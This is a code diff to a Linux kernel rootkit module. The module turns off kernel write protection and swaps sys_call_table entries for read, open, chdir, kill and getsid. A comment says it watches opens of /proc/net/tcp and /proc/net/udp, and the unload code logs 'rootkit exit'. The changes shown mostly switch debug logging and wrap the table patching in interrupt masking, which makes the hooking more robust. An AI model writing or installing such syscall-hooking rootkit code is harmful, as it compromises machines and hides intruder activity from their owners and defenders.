@@ -4,20 +4,22 @@
 static void disable_write_protection(void);
 static void enable_write_protection(void);
 static unsigned long **sys_call_table;
+static unsigned long irq_flags;
 
 /**
  *  sys_read - 3
  * 
  */
-#define DEBUG_READ
+//#define DEBUG_READ
+
 RT_SYSCALL_DEFINE(long, read, unsigned int fd,
         char __user *buf, size_t count) {
     int ret;
 
 #ifdef DEBUG_READ
-    DLog("read:fd:[%d],count:[%d]",fd,count);
+    DLog("read:fd:[%d],count:[%d]", fd, count);
 #endif
-    
+
     ret = RT_SYSCALL_CALL(read, fd, buf, count);
     return ret;
 }
@@ -26,7 +28,8 @@ RT_SYSCALL_DEFINE(long, read, unsigned int fd,
  * sys_open - 5
  * 只检查打开的文件是否是 /proc/net/tcp 或 /proc/net/udp，否则调用正常中断
  */
-#define DEBUG_OPEN
+//#define DEBUG_OPEN
+
 RT_SYSCALL_DEFINE(long, open, const char __user *filename,
         int flags, int mode) {
     int ret;
@@ -49,6 +52,7 @@ RT_SYSCALL_DEFINE(long, open, const char __user *filename,
  *  sys_chdir - 12
  */
 #define DEBUG_CHDIR
+
 RT_SYSCALL_DEFINE(long, chdir, const char __user *filename) {
     int ret;
 
@@ -70,13 +74,14 @@ RT_SYSCALL_DEFINE(long, chdir, const char __user *filename) {
  *  sys_kill - 37
  */
 #define DEBUG_KILL
+
 RT_SYSCALL_DEFINE(long, kill, int pid, int sig) {
     long ret = 0;
 
 #ifdef DEBUG_KILL
-    DLog("kill:pid:[%d],sig:[%d]",pid,sig);
+    DLog("kill:pid:[%d],sig:[%d]", pid, sig);
 #endif
-    
+
     ret = RT_SYSCALL_CALL(kill, pid, sig);
     return ret;
 }
@@ -85,10 +90,11 @@ RT_SYSCALL_DEFINE(long, kill, int pid, int sig) {
  * sys_getsid - 66
  */
 #define DEBUG_GETSID
+
 RT_SYSCALL_DEFINE(long, getsid, pid_t pid) {
     int ret;
 #ifdef DEBUG_GETSID
-    DLog("getsid:pid:[%d]",pid);
+    DLog("getsid:pid:[%d]", pid);
 #endif    
     ret = RT_SYSCALL_CALL(getsid, pid);
     return ret;
@@ -121,7 +127,6 @@ RT_SYSCALL_DEFINE(long, getdents64, unsigned int fd,
     return ret;
 }
 
-
 /**
  * sys_getpgid - 20号
  * 取得目前 process 的 thread ID (process ID)
@@ -132,7 +137,6 @@ RT_SYSCALL_DEFINE(long, getpgid, pid_t pid) {
     ret = RT_SYSCALL_CALL(getpgid, pid);
     return ret;
 }
-
 
 RT_SYSCALL_DEFINE(long, sched_getscheduler, pid_t pid) {
     int ret;
@@ -263,8 +267,10 @@ ThisInit(void) {
         return -1;
     }
 
-    disable_write_protection();
+    local_irq_save(irq_flags);
     
+    disable_write_protection();
+
     RT_SYSCALL_REPLACE(read); //3
     RT_SYSCALL_REPLACE(open); //5    
     RT_SYSCALL_REPLACE(chdir); //12
@@ -272,12 +278,13 @@ ThisInit(void) {
     RT_SYSCALL_REPLACE(getsid); //66
 
     enable_write_protection();
-
+    local_irq_restore(irq_flags);
     return 0;
 }
 
 static void __exit
 ThisExit(void) {
+    local_irq_save(irq_flags);
 
     disable_write_protection();
 
@@ -289,6 +296,7 @@ ThisExit(void) {
 
     enable_write_protection();
 
+    local_irq_restore(irq_flags);
     DLog("rootkit exit");
 }
 
